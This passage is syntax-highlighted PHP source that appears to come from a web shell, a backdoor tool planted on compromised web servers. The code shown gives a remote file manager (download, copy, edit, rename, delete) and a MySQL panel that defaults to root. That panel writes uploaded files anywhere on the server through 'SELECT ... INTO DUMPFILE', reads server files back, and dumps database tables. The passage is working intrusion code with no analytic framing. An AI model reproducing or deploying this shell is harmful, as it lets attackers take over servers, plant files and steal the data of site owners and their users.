<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Down&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:copyfile(\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;Co</span><span style="color: #70c0b1; text-decoration: underline;">py&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:rename(\''</span>.$<span style="color: #e7c547;">filedb</span>[<span style="color: #70c0b1;">'server_link'</span>].<span style="color: #70c0b1;">'\');"&gt;Rena</span><span style="color: #70c0b1; text-decoration: underline;">me&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">file_i</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #70c0b1; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.<span style="color: #eaeaea; background-color: #000000;">bg(</span>).<span style="color: #70c0b1;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t</span><span style="color: #70c0b1; text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dir_i</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' directories / '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">file_i</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' files&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">end dir</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'sqlfile'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">doing</span>==<span style="color: #70c0b1;">"mysqlupload"</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">file</span> = $<span style="color: #7aa6da;">_FILES</span>[<span style="color: #70c0b1;">'uploadfile'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filename</span> = $<span style="color: #e7c547;">file</span>[<span style="color: #70c0b1;">'tmp_name'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">savepath</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'The goal file has already existed'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!$<span style="color: #e7c547;">filename</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Please choose a file'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span>=@<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">filename</span>,<span style="color: #70c0b1;">'r'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">contents</span>=@<span style="color: #eaeaea; background-color: #000000;">fread(</span>$<span style="color: #e7c547;">fp</span>, <span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">filename</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">contents</span> = <span style="color: #eaeaea; background-color: #000000;">bin2hex(</span>$<span style="color: #e7c547;">contents</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!$<span style="color: #e7c547;">upname</span>) $<span style="color: #e7c547;">upname</span> = $<span style="color: #e7c547;">file</span>[<span style="color: #70c0b1;">'name'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>,$<span style="color: #e7c547;">charset</span>,$<span style="color: #e7c547; text-decoration: underline;">dbport</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE </span><span style="color: #70c0b1; text-decoration: underline;">'$savepath';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span>$<span style="color: #e7c547;">result</span> ? <span style="color: #70c0b1;">'Upload success'</span> : <span style="color: #70c0b1;">'Upload has failed: '</span>.<span style="color: #eaeaea; background-color: #000000;">mysql_error</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="color: #c397d8;">?&gt;</span>
<span style="color: #7aa6da;">&lt;script</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"text/javascript"</span><span style="color: #7aa6da;">&gt;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">mysqlfile</span>(<span style="color: #d54e53; font-weight: bold;">doing</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!<span style="color: #d54e53; font-weight: bold;">doing</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'doing'</span>).<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">doing</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #d54e53; font-weight: bold;">dbhost</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'dbinfo'</span>).<span style="color: #d54e53; font-weight: bold;">dbhost</span>.<span style="color: #d54e53; font-weight: bold;">value</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #d54e53; font-weight: bold;">dbport</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'dbinfo'</span>).<span style="color: #d54e53; font-weight: bold;">dbport</span>.<span style="color: #d54e53; font-weight: bold;">value</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #d54e53; font-weight: bold;">dbuser</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'dbinfo'</span>).<span style="color: #d54e53; font-weight: bold;">dbuser</span>.<span style="color: #d54e53; font-weight: bold;">value</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #d54e53; font-weight: bold;">dbpass</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'dbinfo'</span>).<span style="color: #d54e53; font-weight: bold;">dbpass</span>.<span style="color: #d54e53; font-weight: bold;">value</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #d54e53; font-weight: bold;">dbname</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'dbinfo'</span>).<span style="color: #d54e53; font-weight: bold;">dbname</span>.<span style="color: #d54e53; font-weight: bold;">value</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #d54e53; font-weight: bold;">charset</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'dbinfo'</span>).<span style="color: #d54e53; font-weight: bold;">charset</span>.<span style="color: #d54e53; font-weight: bold;">value</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'mysqlfile'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #7aa6da;">&lt;/script&gt;</span>
<span style="color: #c397d8;">&lt;?php</span>
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dbhost</span> &amp;&amp; $<span style="color: #e7c547;">dbhost</span> = <span style="color: #70c0b1;">'localhost'</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dbuser</span> &amp;&amp; $<span style="color: #e7c547;">dbuser</span> = <span style="color: #70c0b1;">'root'</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dbport</span> &amp;&amp; $<span style="color: #e7c547;">dbport</span> = <span style="color: #70c0b1;">'3306'</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=<span style="color: #7aa6da;">&gt;</span><span style="color: #70c0b1;">'MYSQL Information'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbinfo'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'sqlfile'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBHost:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbhost'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">20</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbhost</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">':'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbport'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">4</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbport</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBUser:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbuser'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">15</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbuser</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBPass:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbpass'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">15</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbpass</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBName:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbname'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">15</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbname</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBCharset:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeselect(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'charset'</span>,<span style="color: #70c0b1;">'option'</span>=&gt;$<span style="color: #e7c547;">charsetdb</span>,<span style="color: #70c0b1;">'selected'</span>=&gt;$<span style="color: #e7c547;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="POST" enctype="multipart/form-data" name</span><span style="color: #70c0b1; text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty</span><span style="color: #70c0b1; text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /</span><span style="color: #70c0b1; text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dbhost'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dbport'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dbuser'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dbpass'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dbname'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'charset'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'doing'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'sqlfile'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/form&gt;'</span>);
}

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'mysqladmin'</span>) {
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dbhost</span> &amp;&amp; $<span style="color: #e7c547;">dbhost</span> = <span style="color: #70c0b1;">'localhost'</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dbuser</span> &amp;&amp; $<span style="color: #e7c547;">dbuser</span> = <span style="color: #70c0b1;">'root'</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">dbport</span> &amp;&amp; $<span style="color: #e7c547;">dbport</span> = <span style="color: #70c0b1;">'3306'</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> = <span style="color: #70c0b1;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbhost</span>)){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> .= <span style="color: #70c0b1;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\</span><span style="color: #70c0b1; text-decoration: underline;">"$dbhost\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbuser</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> .= <span style="color: #70c0b1;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\</span><span style="color: #70c0b1; text-decoration: underline;">"$dbuser\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbpass</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> .= <span style="color: #70c0b1;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\</span><span style="color: #70c0b1; text-decoration: underline;">"$dbpass\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbport</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> .= <span style="color: #70c0b1;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\</span><span style="color: #70c0b1; text-decoration: underline;">"$dbport\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbname</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> .= <span style="color: #70c0b1;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\</span><span style="color: #70c0b1; text-decoration: underline;">"$dbname\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">charset</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbform</span> .= <span style="color: #70c0b1;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value</span><span style="color: #70c0b1; text-decoration: underline;">=\"$charset\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'backupmysql'</span> &amp;&amp; $<span style="color: #e7c547;">saveasfile</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">table</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Please choose the table'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>,$<span style="color: #e7c547;">charset</span>,$<span style="color: #e7c547;">dbpo</span><span style="color: #e7c547; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span> = @<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">path</span>,<span style="color: #70c0b1;">'w'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">fp</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">table</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">k</span> =&gt; $<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">sqldumptable(</span>$<span style="color: #e7c547;">v</span>, $<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);<span style="color: #d54e53; background-color: #424242;">                </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fileurl</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #d54e53; font-weight: bold;">SA_ROOT</span>,<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">path</span>);
